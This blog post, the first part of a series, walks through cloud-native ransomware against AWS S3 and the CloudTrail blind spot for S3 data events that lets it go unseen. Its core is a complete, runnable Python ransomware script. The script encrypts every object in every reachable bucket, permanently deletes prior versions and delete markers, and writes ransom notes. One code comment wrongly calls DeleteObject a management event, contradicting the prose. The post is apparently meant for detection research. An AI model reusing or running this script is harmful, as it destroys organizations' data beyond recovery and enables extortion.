---
title: "ransoming your cloud infra — pt. 1"
date: 2026-04-04
severity: "high"
status: "Open"
category: "SOC Engineering / Guides"
threat_actor: ""
confidence: ""
tlp: "WHITE"
tags: ["AWS", "cloud-security", "ransomware", "VPC", "CloudTrail", "detection-engineering", "offensive-security", "defense"]
mitre: []
iocs: []
timeline:
  - { time: "Apr 4, 2026", action: "Started writing about cloud ransomware", detail: "There's barely any research on ransoming cloud infra, figured I'd put something together from a practical perspective." }
related_cases: ["vulnerability-research"]
cover:
---

# Preface

If you spend any amount of time in infosec circles, you'll notice that the vast majority of offensive research is still centered around endpoint malware, Active Directory abuse, EDR evasion and auth-provider shenanigans. And honestly? That makes sense! That's where the industry mostly grew up. The tooling ecosystem around AD alone is absurd; BloodHound, Mimikatz, Rubeus, Impacket, CrackMapExec, the list goes on and on. Meanwhile, cloud offensive tooling is still pretty fragmented — there's no unified kill chain equivalent to the BloodHound-to-Mimikatz-to-CrackMapExec pipeline that AD pentesters take for granted. SentinelOne noted there are "far fewer references to scripts designed to perform ransom attacks directly on cloud services"[^1] and Fortinet's 2026 Cloud Security Report found that 74% of organizations still report a shortage of qualified cloud security professionals[^2]. Cloud security is still treated as the nerdy cousin nobody invites to dinner.

The thing is, the infrastructure has moved. Like, significantly. SaaS revenue went from roughly $31 billion in 2015 to over $300 billion in 2025[^3] and cloud adoption is sitting at something like 94% across enterprises[^4]. Most companies founded in the last decade have never even touched on-prem!!! Their entire product, their customer data, their IP, all of it lives in AWS, Azure or GCP. When Unit 42 looked at their IR engagements, they found that 87% of intrusions spanned multiple attack surfaces including cloud infrastructure, SaaS and identity systems[^5]. So yeah, the money moved to the cloud but research didn't. Or at least not nearly at the same pace.

And it's not like attackers haven't noticed! Supply chain attacks are increasingly designed to harvest cloud credentials and I'm not talking about obscure packages nobody's heard of. Axios, with 70 million weekly downloads, got popped in March 2026[^6]. The backdoor dropped a RAT that immediately scraped AWS access keys (AKIAs), Azure creds and Github tokens. A week earlier, LiteLLM got hit through a poisioned Github action in their CI/CD pipeline[^7]. That one was a bit nastier, the payload ran on every Python process startup and went after AWS creds, Secrets Manager, IMDSv2, Kubernetes secrets and more[^8]. TeamTNT for example evolved from basic cryptojacdking to running enum scripts with 70+ AWS CLI commands against stolen accounts[^9]. SCARLETEEL popped a k8s pod and pivoted straight into AWS through Terraform state files containing IAM keys[^10]. There's a whole market for this stuff[^11]! 

But from what I've seen, once you get past the initial access stuff, the research gets real thin. There's not a whole lot of published work on what actually happens once an attacker is sitting on valid IAM keys to some SaaS company's production AWS account. What does cloud-native ransomware actually look like? How do you hold someone's S3 data hostage without downloading a single byte? What logs would even catch it and does anyone actually have those logs turned on? And no, I'm not counting the dozen blogposts that are essentially reworded versions of Rhino Security's S3 ransomware research[^12].

That's what this series is about. I want to walk through known and less-known cloud exploitation techniques that are either hard to detect or straight up overlooked because the telemetry most orgs rely on just doesn't cover them. If you've read my previous posts, you already know how I feel about CloudTrail data events and the lovely bill that comes with them. Turns out that blind spot gets a lot scarier when you start thinking about what an attacker can do inside of it.

## The lab

To actually demonstrate all of this, I built a fake SaaS company's AWS environment. 15 S3 buckets, ~920K objects, roughly 250GB of data spread across different teams with varying levels of "we actually gave a shit when configuring this." Some buckets have KMS encryption and versioning, others have neither. You know, like a real company.

```hcl
resource "aws_s3_bucket" "customer_data" {
  bucket = "acmecorp-prod-customer-data-lake-us-east-1"
}

# enabling versioning so we can roll back objects if something goes wrong
resource "aws_s3_bucket_versioning" "customer_data" {
  bucket = aws_s3_bucket.customer_data.id

  versioning_configuration {
    status = "Enabled"
  }
}

# enabling SSE-KMS because "this is customer data and compliance requires
# encryption at rest with a managed key". bucket keys enabled to keep
# KMS costs down (caches a bucket-level key instead of calling KMS per object)
resource "aws_s3_bucket_server_side_encryption_configuration" "customer_data" {
  bucket = aws_s3_bucket.customer_data.id

  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
    bucket_key_enabled = true
  }
}

# blocking public access
resource "aws_s3_bucket_public_access_block" "customer_data" {
  bucket = aws_s3_bucket.customer_data.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

Not all 15 buckets look this clean though. Some have versioning off, some use AES256 instead of KMS, and the media pipeline bucket somehow ended up with no encryption at all. The usual.

## The monitoring stack

For monitoring, we're going with what I'd call the "smart but cost sensitive" setup that a lot of companies actually run. All CloudTrail management events get forwarded to [REDACTED SIEM VENDOR] through an EventBridge rule set to `ENABLED_WITH_ALL_CLOUDTRAIL_MANAGEMENT_EVENTS`. If you've read my [S3 squatting post](/cases/s3-squatting), you already know why this matters. The short version is that `ENABLED` and `ENABLED_WITH_ALL_CLOUDTRAIL_MANAGEMENT_EVENTS` are not the same thing and the difference is massive. The regular `ENABLED` state only gives you what AWS services natively push to EventBridge which misses a ton of read-only API calls. We're talking login events (`ConsoleLogin`, `AssumeRole`, `GetSessionToken`), IAM recon (`GetRole`, `GetPolicy`, `ListRoles`), KMS activity (`DescribeKey`, `GetKeyPolicy`), secrets discovery (`GetSecretValue`, `DescribeSecret`) and storage recon (`ListBuckets`, `GetBucketPolicy`). Basically all the stuff an attacker does first when they land in your account.

`ENABLED_WITH_ALL_CLOUDTRAIL_MANAGEMENT_EVENTS` dumps everything CloudTrail picks up on top of that. It does a LOT of carrying for the price of free (management events are included in the CloudTrail free tier). So our ACME Corp SOC team is at least not completely blind here.

What we're _not_ monitoring however is data events. No S3 `GetObject`/`PutObject` logging, no Lambda invocation logs, no DynamoDB item-level activity. Because as we've established, that stuff gets expensive fast and finance said no. This is going to be important later.

# The Skid Attack

For this scenario, let's assume you're a skid that managed to pop an app somehow. You've put your hands on an access key whose associated role has a policy like this:

```hcl
{
    "Effect": "Allow",
    "Action": [
        "s3:GetObject",
        "s3:GetObjectVersion",
        "s3:PutObject",
        "s3:DeleteObject",
        "s3:DeleteObjectVersion",
        "s3:ListBucket",
        "s3:ListBucketVersions"
    ],
    "Resource": [
        "arn:aws:s3:::your-bucket",
        "arn:aws:s3:::your-bucket/*"
    ]
}
```
One thing worth noting here: `s3:DeleteObject` and `s3:DeleteObjectVersion` are two separate IAM actions even though they use the same API call[^17]. `DeleteObject` without a `VersionId` just creates a delete marker (the object is still there). `DeleteObject` _with_ a `VersionId` permanently removes that version, but it requires `s3:DeleteObjectVersion`. Both show up as `DeleteObject` in CloudTrail though, and both are data events. AWS really loves making things clear and simple.

If you're already going "uuuuuuuuuuuh but dude, WHO WOULD EVER PUT ALL THESE PERMISSIONS ON THE APP?!" well to answer your question: [a lot of people](https://github.com/search?q=%22DeleteObjectVersion%22+language%3Ahcl&type=code). This is actually pretty dang sane when we compare it to it's much worse alternative: [the S3 wildcard](https://github.com/search?q=%22s3%3A*%22+language%3Ahcl+%22Effect%22+%22Allow%22&type=code). Just as an example of how "realistic" this situation is, here are a few example of actual applications with `DeleteObjectVersion` granted to the app:

- [Polar](https://github.com/polarsource/polar/blob/main/terraform/modules/application_access/main.tf) (open-source funding platform), on the app's S3 user for managing user uploads
- [UK Ministry of Justice's Digideps](https://github.com/ministryofjustice/opg-digideps/blob/main/terraform/environment/region/ecs_iam_front.tf), on the frontend ECS task role. They even have a trivy ignore comment acknowledging the overpermission and shipped it anyway.
- [Paragon](https://github.com/useparagon/aws-on-prem/blob/main/terraform/workspaces/infra/storage/s3-app.tf) (integration platform), on their app's S3 user with static access keys
- [NASA PO.DAAC's HiTIDE](https://github.com/podaac/hitide-backfill-tool/blob/main/terraform-deploy/fargate.tf), on a Fargate task role with `arn:aws:s3:::*`. Yes, every bucket in the account.
- [Daytona](https://github.com/daytonaio/terraform-modules/blob/main/region/snapshot_manager.tf) (dev environment platform), ECS task role for their snapshot manager
- [Expedia's Apiary Federation](https://github.com/ExpediaGroup/apiary-federation/blob/main/common.tf), on their Hive metastore federation service role

Now back to what I was saying, we're got r/w on some S3 buckets. A somewhat naive approach to ransoming this data would be to simply download all of it locally, encrypt it and reupload it. Doing so this way makes it so we leave nearly no management events as all we're doing is downloading and uploading data. If we were a tiny bit smart we'd probably run this from an attacker controlled AWS instance to leverage the AWS backbone (network wise) as our actions will cause quite a bit of ingress and egress. Why? Because traffic between AWS services stays on AWS's internal network and never hits the public internet, even when using public IPs[^13]. As AWS puts it:

> Traffic that is in an Availability Zone, or between Availability Zones in all Regions, routes over the AWS private global network.

In practice this means same-region EC2-to-S3 transfers can hit up to 100 Gbps on larger instances. Compare that to the maybe 1 Gbps you'd get from a random VPS somewhere and the choice is obvious. Spin up a beefy EC2 in the same region as the target bucket and you're moving data orders of magnitude faster than you would from the outside. This also has the benefit of making our IP look a tiny bit less sus. There's obviously more tricks we could use such as spinning up lambdas to copy those files to an attacker S3 bucket, leveraging [S3 batch operations](https://docs.aws.amazon.com/AmazonS3/latest/userguide/batch-ops.html) and more but for this first part we'll stick to the skid approach. At that's left do now that we know is build the actual script that will:

1. Generate our encryption key
2. List all buckets we have access to (`ListBuckets` is the only management event in this sequence of events)
3. Download each objects & encrypt it locally with `AES-256-GCM` (still a Data event here)
4. Re-upload the now encrypted file (once again, another unmonitored Data event)
5. Delete all old object versions only after the encryption is done. Here's the fun part: `DeleteObject` and `DeleteObjects` are also data events[^14], not management events. Every single step of this attack operates entirely in the data plane. Without S3 data event logging enabled, the SOC sees absolutely nothing. Zero. Nada.

### A quick note on deleting versions

You might be wondering how we actually get rid of the old versions. When versioning is enabled, a normal `DeleteObject` call doesn't actually delete anything, it just slaps a delete marker on top. The object is still there, all previous versions are still there, and the victim can restore everything.

To permanently remove a specific version, you need to pass a `VersionId` to your delete call. And to know which versions exist, you need to call `ListObjectVersions` which gives you back every version of every object in the bucket along with their `VersionId`. Once you have those, you can pass them to `DeleteObjects` in batches of 1000 to permanently remove them.

Here's where it gets interesting. You'd think that permanently deleting a versioned object would at least generate a management event right? Something the SOC could catch? Nope. Even though `s3:DeleteObjectVersion` is a separate IAM permission from `s3:DeleteObject`[^17], they both use the exact same `DeleteObject` API call under the hood. The only difference is whether you include a `versionId` parameter or not. And CloudTrail logs both as the same `DeleteObject` event name, which is classified as a data event[^14]. There is no separate `DeleteObjectVersion` event in CloudTrail. It simply doesn't exist.

So let's recap what our SOC would actually see for this entire attack:

| Step | API Call | CloudTrail Event Type |
|---|---|---|
| Enumerate buckets | `ListBuckets` | Management event |
| List objects | `ListObjectsV2` | Data event |
| Download objects | `GetObject` | Data event |
| Upload encrypted objects | `PutObject` | Data event |
| List versions | `ListObjectVersions` | Data event |
| Delete old versions | `DeleteObject` (with `versionId`) | Data event |

One `ListBuckets` call. That's the only management event. Everything else is in the data plane and completely invisible without data event logging. If the app role has `s3:DeleteObjectVersion` + `s3:ListBucketVersions`, you've got everything you need to enumerate and permanently destroy every previous version without raising a single alert.

Now that's we've got a plan, we're ready to execute. Keeping things simple we can build our skid code something like this:
```py
import sys
import secrets
import hashlib
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

import boto3
from botocore.config import Config
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# crank this up if you're on a beefy instance, 200 is a good sweet spot
# before S3 starts getting annoyed with you
WORKERS = 200

# match the connection pool to the worker count otherwise threads
# just sit there waiting for a connection like idiots
S3_CONFIG = Config(max_pool_connections=WORKERS, retries={"max_attempts": 3, "mode": "adaptive"})


def generate_key():
    # AES-256 = 32 bytes of randomness. save it to disk because
    # if we lose this key the data is gone and we can't even
    # pretend to offer recovery
    key = secrets.token_bytes(32)
    key_hex = key.hex()

    key_path = Path("ransom.key")
    key_path.write_text(key_hex)
    print(f"key saved to {key_path}")
    print(f"key: {key_hex}")
    print(f"sha256: {hashlib.sha256(key).hexdigest()}")

    return key


def list_buckets(s3_client):
    resp = s3_client.list_buckets()
    buckets = [b["Name"] for b in resp.get("Buckets", [])]
    print(f"found {len(buckets)} buckets")
    for b in buckets:
        print(f"    - {b}")
    return buckets


def list_all_objects(s3_client, buckets):
    """List objects across all buckets, returns list of (bucket, key) tuples."""
    all_objects = []

    for bucket in buckets:
        paginator = s3_client.get_paginator("list_objects_v2")
        count = 0
        for page in paginator.paginate(Bucket=bucket):
            for obj in page.get("Contents", []):
                all_objects.append((bucket, obj["Key"]))
                count += 1
        print(f"    {bucket}: {count} objects")

    return all_objects


def encrypt_bytes(plaintext, key):
    aesgcm = AESGCM(key)
    nonce = secrets.token_bytes(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return nonce + ciphertext


def process_object(bucket, obj_key, encryption_key):
    # each thread gets its own s3 client to avoid connection pool contention.
    # download the object into memory, encrypt it, shove it back. no disk io.
    s3 = boto3.client("s3", config=S3_CONFIG)

    resp = s3.get_object(Bucket=bucket, Key=obj_key)
    plaintext = resp["Body"].read()

    encrypted = encrypt_bytes(plaintext, encryption_key)

    s3.put_object(Bucket=bucket, Key=obj_key, Body=encrypted)

    return bucket, obj_key


def delete_old_versions(bucket):
    # kill all previous versions so the victim can't just restore from
    # a prior version. this is the noisy part since DeleteObject is a
    # management event that shows up in CloudTrail.
    s3 = boto3.client("s3", config=S3_CONFIG)
    paginator = s3.get_paginator("list_object_versions")
    deleted = 0

    for page in paginator.paginate(Bucket=bucket):
        # batch delete is way faster than individual calls
        to_delete = []

        for version in page.get("Versions", []):
            if not version.get("IsLatest", False):
                to_delete.append({"Key": version["Key"], "VersionId": version["VersionId"]})

        for marker in page.get("DeleteMarkers", []):
            to_delete.append({"Key": marker["Key"], "VersionId": marker["VersionId"]})

        if to_delete:
            # delete_objects handles up to 1000 per call
            for i in range(0, len(to_delete), 1000):
                batch = to_delete[i : i + 1000]
                s3.delete_objects(Bucket=bucket, Delete={"Objects": batch, "Quiet": True})
                deleted += len(batch)

    return deleted


def main():
    s3 = boto3.client("s3", config=S3_CONFIG)
    start = time.time()

    print("\ngenerating encryption key")
    key = generate_key()

    print("\nenumerating buckets and objects")
    buckets = list_buckets(s3)

    if not buckets:
        print("no buckets found, exiting")
        sys.exit(1)

    all_objects = list_all_objects(s3, buckets)
    print(f"\n{len(all_objects)} objects across {len(buckets)} buckets")

    # all objects from all buckets go into one big thread pool.
    # no reason to do one bucket at a time when we can hit them all at once
    print(f"\nencrypting with {WORKERS} workers")
    processed = 0
    failed = 0

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {
            pool.submit(process_object, bucket, obj_key, key): (bucket, obj_key)
            for bucket, obj_key in all_objects
        }

        for future in as_completed(futures):
            try:
                future.result()
                processed += 1
                if processed % 1000 == 0:
                    elapsed = time.time() - start
                    rate = processed / elapsed
                    print(f"  {processed}/{len(all_objects)} ({rate:.0f} obj/s)")
            except Exception as e:
                failed += 1
                bucket, obj_key = futures[future]
                print(f"  failed {bucket}/{obj_key}: {e}")

    encrypt_time = time.time() - start
    print(f"\nencryption done: {processed} ok, {failed} failed ({encrypt_time:.1f}s)")

    # only nuke versions AFTER everything is encrypted.
    # one thread per bucket since delete_objects batches handle the rest
    print("\ndeleting old object versions")
    version_start = time.time()

    with ThreadPoolExecutor(max_workers=len(buckets)) as pool:
        futures = {pool.submit(delete_old_versions, b): b for b in buckets}

        for future in as_completed(futures):
            bucket = futures[future]
            try:
                deleted = future.result()
                print(f"  {bucket}: {deleted} versions removed")
            except Exception as e:
                print(f"  {bucket}: failed ({e})")

    version_time = time.time() - version_start
    print(f"version cleanup done ({version_time:.1f}s)")

    print("\ndropping ransom notes")
    note = (
        "Your data has been encrypted. "
        "Contact us at totallylegit@protonmail.com with the bucket name "
        "and proof of ownership to negotiate recovery. "
        "Do not attempt to modify or delete the encrypted files."
    )
    for bucket in buckets:
        s3.put_object(Bucket=bucket, Key="RANSOM_NOTE.txt", Body=note.encode())
        print(f"  {bucket}")

    total_time = time.time() - start
    print(f"\ndone in {total_time:.1f}s")
    print(f"{processed} objects encrypted across {len(buckets)} buckets")
    print("key saved to ransom.key")


if __name__ == "__main__":
    main()
```

We run the script, it does it's thing in roughly 5 minutes and just like that, the content of the buckets go from this
![](/images/ransoming-your-cloud-infra-pt1/pre-ransom.png)

To whatever this garbage is
![](/images/ransoming-your-cloud-infra-pt1/post-ransom.png)

And after a bit (once the service start failing) we get someone freaking out over this:
![](/images/ransoming-your-cloud-infra-pt1/post-ransom.png)

## So what did the SOC see?

Pretty much nothing. The `GetObject` and `PutObject` calls that did all the heavy lifting? Data events. Not monitored. The `ListObjectsV2` to enumerate targets? Data event. The `DeleteObject` and `DeleteObjects` calls that nuked all previous versions? Also data events[^14]. The entire kill chain from enumeration to encryption to version deletion operates exclusively in the data plane. Without S3 data event logging, the SOC literally has no record of any of it happening.

"But wait, the buckets are KMS-encrypted! Surely all those `kms:Decrypt` and `kms:GenerateDataKey` calls would light up like a Christmas tree?" Yeah, that's what I thought too. Turns out, not really.

Remember the `bucket_key_enabled = true` in our Terraform config? That's **S3 Bucket Keys** (which has been the default since 2023[^15]). When this is on, S3 generates a short-lived bucket-level key from KMS and caches it. That cached key then creates data keys locally for a bunch of objects without going back to KMS each time. AWS says this reduces KMS API calls by up to 99%[^15]. So instead of 53,000 `kms:Decrypt` calls for 53,000 objects, you get maybe a dozen. The exact cache duration isn't documented either, AWS just calls it "short-lived" and "time-limited."

Without Bucket Keys (legacy setups), S3 _does_ call KMS for every single object[^16]. That would generate a noticeable spike in KMS events. But even then, `kms:Decrypt` and `kms:GenerateDataKey` are completely normal S3 operations that happen millions of times a day in any active AWS account. You'd need a very specific detection rule to distinguish "app doing normal reads/writes" from "attacker encrypting everything in sight." And most SOC teams don't have that rule.

The only management event our attack generated was `ListBuckets` in step 2 (it operates at the account level so it's a management event). That's it. A single `ListBuckets` call buried in the noise of every other service that calls it constantly. Good luck writing an alert for that.

---

[^1]: https://www.sentinelone.com/blog/the-state-of-cloud-ransomware-in-2024/

[^2]: https://www.fortinet.com/content/dam/fortinet/assets/reports/2025-cybersecurity-skills-gap-report.pdf

[^3]: https://www.saastr.com/gartner-saas-spend-is-actually-accelerating-will-hit-300-billion-in-2025/

[^4]: https://www.cloudzero.com/blog/cloud-computing-statistics/

[^5]: https://www.paloaltonetworks.com/blog/2026/02/unit-42-global-ir-report/

[^6]: https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/

[^7]: https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/

[^8]: https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer

[^9]: https://unit42.paloaltonetworks.com/teamtnt-operations-cloud-environments/

[^10]: https://www.sysdig.com/blog/cloud-breach-terraform-data-theft

[^11]: https://www.darkreading.com/threat-intelligence/sale-of-stolen-credentials-and-initial-access-dominate-dark-web-markets

[^12]: https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/

[^13]: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html

[^14]: https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-logging-s3-info.html

[^15]: https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucket-key.html

[^16]: https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingKMSEncryption.html

[^17]: https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazons3.html